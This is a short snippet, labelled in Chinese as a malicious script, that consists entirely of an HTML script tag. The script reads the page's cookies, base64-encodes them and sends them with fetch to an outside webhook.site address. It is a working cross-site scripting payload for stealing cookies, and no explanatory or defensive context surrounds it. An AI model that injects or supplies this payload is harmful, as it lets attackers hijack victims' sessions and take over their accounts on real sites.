// 惡意 script
<script>
  var cookie = document.cookie;
  fetch("https://webhook.site/7916beea-b3a9-4e85-bce4-d650211fbb0d?cookie="+window.btoa(cookie))
</script>;
